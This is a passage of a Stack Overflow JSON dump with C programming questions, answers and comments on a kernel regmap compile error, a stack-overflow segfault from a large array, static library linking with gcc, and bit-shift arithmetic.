"comment_id": 54080809, "body": "So what is not clear in the warning message?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444853248, "post_id": 33134452, "comment_id": 54080822, "body": "Seems the kernel headers used for compilation are too old, probably the whole kernel though. So, which kernel do you use?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1444853389, "post_id": 33134452, "comment_id": 54080900, "body": "It&#39;s probably to &quot;thin&quot; for an answer, so just commenting: look up the actual declaration of the <code>struct</code> in question in your kernel source. It seems to differ from what you expect."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444854355, "post_id": 33134452, "comment_id": 54081477, "body": "The definition in question is here: <a href=\"http://lxr.free-electrons.com/source/include/linux/regmap.h?v=3.14#L210\" rel=\"nofollow noreferrer\">lxr.free-electrons.com/source/include/linux/&hellip;</a>"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444855626, "post_id": 33134452, "comment_id": 54082163, "body": "Same question here: <a href=\"http://askubuntu.com/q/685552/419557\">askubuntu.com/q/685552/419557</a>"}, {"owner": {"reputation": 1, "user_id": 5446350, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aac24655b709872cb974e011e8ad7aa6?s=128&d=identicon&r=PG&f=1", "display_name": "Alsanie", "link": "https://stackoverflow.com/users/5446350/alsanie"}, "edited": false, "score": 0, "creation_date": 1444860223, "post_id": 33134452, "comment_id": 54084313, "body": "This kernel version 3.14.40"}], "owner": {"reputation": 1, "user_id": 5446350, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aac24655b709872cb974e011e8ad7aa6?s=128&d=identicon&r=PG&f=1", "display_name": "Alsanie", "link": "https://stackoverflow.com/users/5446350/alsanie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 338, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1444853291, "creation_date": 1444852528, "last_edit_date": 1444853291, "question_id": 33134452, "link": "https://stackoverflow.com/questions/33134452/compiler-error-regmap-config-error-unknown-field-cache-type-specified-in", "title": "Compiler error (regmap_config) =&gt; error: unknown field &#39;cache_type&#39; specified in initializer", "body": "<p>I am trying to build a I2C kernel driver but I am getting this error from the compiler: (related to struct regmap_config)</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>kernelDrv.h:64:2: warning: excess elements in struct initializer [enabled by default]\n\nkernelDrv/kernelDrv.h:64:2: warning: (near initialization for 'kernelDrvRegmapConfig') [enabled by default]\n\nkernelDrv/kernelDrv.h:65:2: error: unknown field 'cache_type' specified in initializer .cache_type = REGCACHE_RBTREE,\n</code></pre>\n\n<p>Thank you</p>\n"}, {"tags": ["c", "arrays", "memset"], "comments": [{"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 2, "creation_date": 1444851801, "post_id": 33134151, "comment_id": 54079963, "body": "The code probably hits the stack&#39;s size limit when trying to allocate this &quot;huge&quot; array."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444851844, "post_id": 33134151, "comment_id": 54079986, "body": "This &quot;<i><code>memset (long_array, 0, ARRAY_SIZE);</code></i>&quot; most likely wouldn&#39;t do what you might expect (but few)."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1444851939, "post_id": 33134151, "comment_id": 54080030, "body": "The very similar question was here like 10 minutes ago..."}, {"owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "edited": false, "score": 0, "creation_date": 1444852028, "post_id": 33134151, "comment_id": 54080089, "body": "the number 0x320204 is equal to 3277316,which is bigger than the stack size."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1444852221, "post_id": 33134151, "comment_id": 54080197, "body": "Aside from <code>ARRAY_SIZE</code> being a large number, code should have been <code>memset(long_array, 0, sizeof *long_array * ARRAY_SIZE);</code> or even better <code>memset(long_array, 0, sizeof long_array);</code>"}, {"owner": {"reputation": 3658, "user_id": 169224, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/13ef7b0733c02a748f8d15cdb049fab7?s=128&d=identicon&r=PG", "display_name": "Kristoffer Bohmann", "link": "https://stackoverflow.com/users/169224/kristoffer-bohmann"}, "edited": false, "score": 0, "creation_date": 1444852312, "post_id": 33134151, "comment_id": 54080252, "body": "Possible dublicate of <a href=\"http://stackoverflow.com/questions/201101/how-to-initialize-an-array-in-c\" title=\"how to initialize an array in c\">stackoverflow.com/questions/201101/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1444852436, "post_id": 33134229, "comment_id": 54080322, "body": "Rather than &quot;need to zero <code>8 * ARRAY_SIZE</code> bytes&quot;, suggest &quot;need to zero <code>sizeof (unsigned long long) * ARRAY_SIZE</code> bytes&quot; or &quot;need to zero <code>sizeof long_array</code> bytes&quot;.  Thus avoiding magic numbers like 8."}, {"owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "edited": false, "score": 1, "creation_date": 1444852529, "post_id": 33134229, "comment_id": 54080369, "body": "Edited, OP is using <code>long</code> (not <code>long long</code>)"}, {"owner": {"reputation": 52050, "user_id": 3093378, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d8214cf99b0fa33b4f7d571801914b53?s=128&d=identicon&r=PG", "display_name": "vsoftco", "link": "https://stackoverflow.com/users/3093378/vsoftco"}, "reply_to_user": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "edited": false, "score": 1, "creation_date": 1444852730, "post_id": 33134229, "comment_id": 54080497, "body": "@AlterMann thanks, my mistake, when I skimmed through the code there were 2 adjacent <code>long</code>&#39;s, and didn&#39;t realize that the last was part of a name :)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "edited": false, "score": 1, "creation_date": 1444855163, "post_id": 33134229, "comment_id": 54081921, "body": "@Alter Mann Your comment is a fine example of why to use <code>sizeof var</code> rather than <code>sizeof(type)</code>."}, {"owner": {"reputation": 52050, "user_id": 3093378, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d8214cf99b0fa33b4f7d571801914b53?s=128&d=identicon&r=PG", "display_name": "vsoftco", "link": "https://stackoverflow.com/users/3093378/vsoftco"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1444855320, "post_id": 33134229, "comment_id": 54082004, "body": "@chux I guess the best is to use <code>ARRAY_SIZE * sizeof *array_name</code>, no more issues whatsoever even if you decide later to change the type."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1444855668, "post_id": 33134229, "comment_id": 54082180, "body": "IMO <code>sizeof array_name</code> is best. YMMV."}, {"owner": {"reputation": 52050, "user_id": 3093378, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d8214cf99b0fa33b4f7d571801914b53?s=128&d=identicon&r=PG", "display_name": "vsoftco", "link": "https://stackoverflow.com/users/3093378/vsoftco"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1444855723, "post_id": 33134229, "comment_id": 54082209, "body": "@chux Yeah, if it&#39;s an array, indeed. The only issue is with dynamic allocated ones, but technically those are not arrays."}], "tags": [], "owner": {"reputation": 52050, "user_id": 3093378, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d8214cf99b0fa33b4f7d571801914b53?s=128&d=identicon&r=PG", "display_name": "vsoftco", "link": "https://stackoverflow.com/users/3093378/vsoftco"}, "is_accepted": false, "score": 4, "last_activity_date": 1444852543, "last_edit_date": 1444852543, "creation_date": 1444851823, "answer_id": 33134229, "question_id": 33134151, "link": "https://stackoverflow.com/questions/33134151/c-program-how-to-initialize-a-long-size-array/33134229#33134229", "title": "C Program - How to initialize a Long Size Array", "body": "<p>The segmentation fault is because you try to allocate on the stack <code>0x320204</code> <code>long</code>s, which may be too much. In decimal, this is <code>3277316 * sizeof(unsigned long)</code>, which on my machine is <code>3277316 * 8 = 26218528</code> bytes, i.e. around 25 Mbytes.</p>\n\n<p>The second way of initializing it is the most common, it will zero all elements. The first method will only zero the first <code>ARRAY_SIZE</code> bytes, but remember that <code>sizeof(unsigned long)</code> is usually <code>8</code> bytes, so you need to zero <code>sizeof(unsigned long) * ARRAY_SIZE</code> bytes.</p>\n"}, {"tags": [], "owner": {"reputation": 4177, "user_id": 3806122, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/cKU37.png?s=128&g=1", "display_name": "Jerfov2", "link": "https://stackoverflow.com/users/3806122/jerfov2"}, "is_accepted": false, "score": 1, "last_activity_date": 1444864046, "creation_date": 1444864046, "answer_id": 33137166, "question_id": 33134151, "link": "https://stackoverflow.com/questions/33134151/c-program-how-to-initialize-a-long-size-array/33137166#33137166", "title": "C Program - How to initialize a Long Size Array", "body": "<p>What you could do is use <a href=\"http://pubs.opengroup.org/onlinepubs/009695399/functions/calloc.html\" rel=\"nofollow\"><code>calloc</code></a>, which is only one call, clearer to a lot of people, though not really a big deal, and uses the heap, which is the biggest benefit. Once you want to make really big array (or objects, or whatever), the heap is the place for you. Eventually, using the stack for this kind of stuff isn't practical, and will likely cause a stackoverflow error. Plus, you can pass this pointer returned from <code>calloc</code> to anything with having to worry what will happen to that memory allocated. This is unlike the stack, where it will probably be overwritten once that function returns, something that has happened to me plenty of times, creating bugs that are super hard to fix. There are downsides, however, to <code>calloc</code> like the fact that its pretty slow, but just as fast as <code>memset</code>in this case. But if you don't really NEED all the bits to be set to 0, you could use <a href=\"http://www.cplusplus.com/reference/cstdlib/malloc/\" rel=\"nofollow\"><code>malloc</code></a> (much faster and more popular). The second downside to <code>calloc</code> or <code>malloc</code> is that you must call <a href=\"http://www.cplusplus.com/reference/cstdlib/free/\" rel=\"nofollow\"><code>free</code></a> on the pointers, otherwise you leak memory. Here's how to use <code>calloc</code>:</p>\n\n<pre><code>#include &lt;stdlib.h&gt; // or \"#include &lt;cstdlib&gt;\" in C++\n\n\n/* Allocate space for array, set all bytes to 0,\n   and return pointer. Then assign to long_array.\n*/\nunsigned long* long_array = (unsigned long*) calloc(ARRAY_SIZE);\n// When you're done with this variable:\nfree(long_array);\n</code></pre>\n\n<p>Easy as that. Both <code>calloc</code> and <code>malloc</code> are made for this kind of stuff. I hope this helped!</p>\n\n<p>Note: Though these links are to a C++ website, you can still use these functions in pure C by including <code>&lt;stdlib.h&gt;</code></p>\n"}], "owner": {"reputation": 111, "user_id": 5269367, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/4b0ece1b4c77e2a9eb6a4e325891ab46?s=128&d=identicon&r=PG&f=1", "display_name": "Hakkim Ansari", "link": "https://stackoverflow.com/users/5269367/hakkim-ansari"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1132, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1444864046, "creation_date": 1444851594, "question_id": 33134151, "link": "https://stackoverflow.com/questions/33134151/c-program-how-to-initialize-a-long-size-array", "title": "C Program - How to initialize a Long Size Array", "body": "<p>I have a programs like this,</p>\n\n<p><strong>Program 1</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define ARRAY_SIZE 0x320204\n\nint main ()\n{\n    unsigned long long_array[ARRAY_SIZE];\n\n    memset (long_array, 0, ARRAY_SIZE);\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Program 2</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define ARRAY_SIZE 0x320204\n\nint main ()\n{\n    unsigned long long_array[ARRAY_SIZE] = {0};\n\n    //memset (long_array, 0, ARRAY_SIZE);\n\n    return 0;\n}\n</code></pre>\n\n<p>Both Programs are giving Segmentation Fault.</p>\n\n<p>Please clarify how to initialize this long size array. Thanks in Advance.</p>\n"}, {"tags": ["c", "libraries"], "comments": [{"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 1, "creation_date": 1444851289, "post_id": 33133935, "comment_id": 54079664, "body": "Is the error message you include representative of the exact source code you are showing?  I do not see a <i>printf(&quot;%d&quot;, suma(1, 2));</i> in your source, but the error message appears to include that statement."}, {"owner": {"reputation": 79096, "user_id": 865874, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ACMnN.png?s=128&g=1", "display_name": "rodrigo", "link": "https://stackoverflow.com/users/865874/rodrigo"}, "reply_to_user": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 1, "creation_date": 1444851667, "post_id": 33133935, "comment_id": 54079889, "body": "@ryyker: It looks like the OP translated the code from Spanish to English for asking the question, but he forgot to redo the error messages."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1444851769, "post_id": 33133935, "comment_id": 54079934, "body": "Indeed ... leads to a piece of advise: <i>always</i> do all your coding in english. It&#39;s MUCH easier to share later (and maybe find team members, contributors, ...)"}], "answers": [{"tags": [], "owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "is_accepted": false, "score": 2, "last_activity_date": 1444851326, "creation_date": 1444851326, "answer_id": 33134076, "question_id": 33133935, "link": "https://stackoverflow.com/questions/33133935/linked-static-libraries-c/33134076#33134076", "title": "linked static libraries C", "body": "<p>Use </p>\n\n<pre><code>gcc main.c -L. -lsum\n</code></pre>\n\n<p>The <code>-L</code> for the directory and the <code>-lsum</code> for the name of the library</p>\n\n<p>The other error is because you didn't include <code>&lt;stdio.h&gt;</code> for your <code>main</code>.</p>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1444852349, "post_id": 33134085, "comment_id": 54080269, "body": "nice to see the (in practice more common) syntax with a library search path, but ... care to explain it, too, to make this a great answer? :)"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1444852547, "post_id": 33134085, "comment_id": 54080379, "body": "Also, you&#39;re right about inclusion in <code>sum.h</code>, but as this seems to be a beginner&#39;s question, a little more elaboration on this (explicitly include where needed, plan for changes!) would probably be nice :) Still very good answer!"}, {"owner": {"reputation": 79096, "user_id": 865874, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ACMnN.png?s=128&g=1", "display_name": "rodrigo", "link": "https://stackoverflow.com/users/865874/rodrigo"}, "edited": false, "score": 0, "creation_date": 1444852704, "post_id": 33134085, "comment_id": 54080481, "body": "@FelixPalmen: Ok, some explanation added. About inclusion, I&#39;m not sure about what the OP is doing with <code>&lt;stdio.h&gt;</code>, but just adding it where the compiler complains is usually is enough, I don&#39;t know what else to add."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1444852861, "post_id": 33134085, "comment_id": 54080577, "body": "yes thanks, showed my appreciation ;) And of course, that&#39;s a basic strategy, but following it, it would be &quot;wrong&quot; in <code>sum.c</code>. What I meant is you also don&#39;t want to rely on <code>stdio.h</code> being included in <code>sum.h</code> either, because <code>sum.h</code> could be changed ... so explicitly add includes exactly where they&#39;re really used."}], "tags": [], "owner": {"reputation": 79096, "user_id": 865874, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ACMnN.png?s=128&g=1", "display_name": "rodrigo", "link": "https://stackoverflow.com/users/865874/rodrigo"}, "is_accepted": true, "score": 4, "last_activity_date": 1444852555, "last_edit_date": 1444852555, "creation_date": 1444851344, "answer_id": 33134085, "question_id": 33133935, "link": "https://stackoverflow.com/questions/33133935/linked-static-libraries-c/33134085#33134085", "title": "linked static libraries C", "body": "<p>You have to link in the library, it is not looked for automatically:</p>\n\n<pre><code>gcc main.c libsum.a\n</code></pre>\n\n<p>Or if you prefer:</p>\n\n<pre><code>gcc main.c -L. -lsum\n</code></pre>\n\n<p>These options are:</p>\n\n<ul>\n<li><code>-L.</code> adds the current directory to the library path. Normally only the system and compiler library directories are included.</li>\n<li><code>-lsum</code> looks for <code>libsum.a</code> (or <code>libsum.so</code>, the dynamic library variant) in the library path.</li>\n</ul>\n\n<p>Note that a library with just one object file is not very useful: you can just link with:</p>\n\n<pre><code>gcc main.c sum.o\n</code></pre>\n\n<p>About the warning, you have to <code>#include &lt;stdio.h&gt;</code> in every compilation unit that uses <code>printf()</code>. You have it in <code>sum.c</code>, but that does not make the declarations available to <code>main.c</code>. If you added it to <code>sum.h</code> then it would have been included (not that it is a good idea to add random <code>include</code>s to your header files).</p>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": false, "score": 1, "last_activity_date": 1444851545, "creation_date": 1444851545, "answer_id": 33134133, "question_id": 33133935, "link": "https://stackoverflow.com/questions/33133935/linked-static-libraries-c/33134133#33134133", "title": "linked static libraries C", "body": "<p>There's more than one error. Let's first focus on the warning here:</p>\n\n<blockquote>\n  <p>main.c:5:2: warning: incompatible implicit declaration of built-in function \u2018printf\u2019 [enabled by default]</p>\n</blockquote>\n\n<p>You forgot to <code>#include &lt;stdio.h&gt;</code>. <code>printf()</code> is declared there. It's not strictly necessary in C to have a declaration of a function before calling it, if you don't have one, it's assumed to take any number of arguments and return <code>int</code>. But this is just legacy. Always make sure to actually <strong>have</strong> a declaration -- for library functions, include the appropriate header.</p>\n\n<p>Then to the linker error: That's easily explained:</p>\n\n<blockquote>\n  <p>gcc main.c</p>\n</blockquote>\n\n<p>This command tries to compile just <code>main.c</code> to an executable. This can't work because in <code>main.c</code>, you call a function that is defined in another module and that isn't <em>magically</em> available to the compiler. In your case, just add your library to the commandline:</p>\n\n<blockquote>\n  <p>gcc main.c libsum.a</p>\n</blockquote>\n\n<p>I didn't try it right now, but it should work.</p>\n"}], "owner": {"reputation": 11, "user_id": 5446637, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/02c39aff0a891db855a67bef55f51f55?s=128&d=identicon&r=PG&f=1", "display_name": "Javier Coque", "link": "https://stackoverflow.com/users/5446637/javier-coque"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "accepted_answer_id": 33134085, "answer_count": 3, "score": -1, "last_activity_date": 1444852555, "creation_date": 1444850801, "last_edit_date": 1592644375, "question_id": 33133935, "link": "https://stackoverflow.com/questions/33133935/linked-static-libraries-c", "title": "linked static libraries C", "body": "<p>I have made my own sample library and I want to use it in my main file. All my code is:</p>\n<p>Sum.h:</p>\n<pre><code>#ifndef _SUM_H_\n#define _SUM_H_\n\nint add(int n1, int n2);\n\n#endif\n</code></pre>\n<p>Sum.c:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &quot;sum.h&quot;\n\nint add(int n1, int n2)\n{\n     return n1 + n2;\n}\n</code></pre>\n<p>main.c:</p>\n<pre><code>#include &quot;sum.h&quot;\n\nint main(int argc, char* argv[])\n{\n    printf(&quot;%d&quot;, add(1, 2));    \n\n    return 0;\n}\n</code></pre>\n<p>For using the library, I have written these commands:</p>\n<blockquote>\n<p>gcc -c -o sum.o sum.c</p>\n<p>ar rcs libsum.a sum.o</p>\n<p>gcc main.c</p>\n</blockquote>\n<p>My problem is that the last command, which compiles the main file, returns me that error:</p>\n<pre class=\"lang-none prettyprint-override\"><code>main.c: In function \u2018main\u2019:\nmain.c:5:2: warning: incompatible implicit declaration of built-in function \u2018printf\u2019 [enabled by default]\n  printf(&quot;%d&quot;, suma(1, 2)); \n  ^\n/tmp/ccyhA7Bc.o: In `main' function:\nmain.c:(.text+0x1a): reference to `sum' undefined \ncollect2: error: ld returned 1 exit status\n</code></pre>\n<p>All files are in the same directory. Where is my mistake? How can I fixed it?</p>\n"}, {"tags": ["c", "bit-shift"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 2, "creation_date": 1444850673, "post_id": 33133794, "comment_id": 54079340, "body": "for <code>c &gt;=w</code> the result of shifting is undefined."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 1, "creation_date": 1444852419, "post_id": 33133794, "comment_id": 54080313, "body": "The result is also undefined if <code>x</code>, <code>y</code> or <code>x+y</code> are signed integers and the corresponding shift causes an overflow."}], "answers": [{"comments": [{"owner": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444852063, "post_id": 33133862, "comment_id": 54080111, "body": "This answer is not satisfactory. Please elaborate with specific values for x and y that result in a counter-example, if any."}, {"owner": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444853425, "post_id": 33133862, "comment_id": 54080917, "body": "I forgot to mention c is non-negative. I&#39;ve added that constraint in my question."}, {"owner": {"reputation": 462, "user_id": 5445883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38536943a5dc29986053782b8f6cab22?s=128&d=identicon&r=PG&f=1", "display_name": "Friwi", "link": "https://stackoverflow.com/users/5445883/friwi"}, "reply_to_user": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444853470, "post_id": 33133862, "comment_id": 54080940, "body": "Your question should be answered now :)"}, {"owner": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444853514, "post_id": 33133862, "comment_id": 54080960, "body": "Oh ! Thanks ! I wish someone could give a rigorous proof on the matter."}, {"owner": {"reputation": 462, "user_id": 5445883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38536943a5dc29986053782b8f6cab22?s=128&d=identicon&r=PG&f=1", "display_name": "Friwi", "link": "https://stackoverflow.com/users/5445883/friwi"}, "reply_to_user": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444853584, "post_id": 33133862, "comment_id": 54081000, "body": "If you shift a value more than its length, it will always be 0 ;)"}, {"owner": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444853748, "post_id": 33133862, "comment_id": 54081100, "body": "But <code>0 &lt;= c &lt; w</code> so we never shift a value more than its length."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1444861419, "post_id": 33133862, "comment_id": 54084788, "body": "@Friwi &quot;shift a value more than its length, it will always be 0&quot; is incorrect in C.  Example <code>INT_MAX &lt;&lt; 1</code>  is undefined behavior in C.  Code may do anything."}, {"owner": {"reputation": 462, "user_id": 5445883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38536943a5dc29986053782b8f6cab22?s=128&d=identicon&r=PG&f=1", "display_name": "Friwi", "link": "https://stackoverflow.com/users/5445883/friwi"}, "edited": false, "score": 0, "creation_date": 1444895725, "post_id": 33133862, "comment_id": 54095779, "body": "In Java this is defined, i think^^"}], "tags": [], "owner": {"reputation": 462, "user_id": 5445883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38536943a5dc29986053782b8f6cab22?s=128&d=identicon&r=PG&f=1", "display_name": "Friwi", "link": "https://stackoverflow.com/users/5445883/friwi"}, "is_accepted": false, "score": 0, "last_activity_date": 1444853418, "last_edit_date": 1444853418, "creation_date": 1444850507, "answer_id": 33133862, "question_id": 33133794, "link": "https://stackoverflow.com/questions/33133794/bitwise-leftshift-operator-distribute-over-addition/33133862#33133862", "title": "Bitwise leftshift operator distribute over addition", "body": "<p>Well ok, for c values greater or equal than 0 your definition should be correct.</p>\n\n<p>Counter example:</p>\n\n<p><code>(x+y)&lt;&lt;c = (x&lt;&lt;c) + (y&lt;&lt;c)\nw=4; c=-1; x=7; y=10;\nSo you got 0111 and 1010:\n(x&lt;&lt;c) + (y&lt;&lt;c) = 0011 + 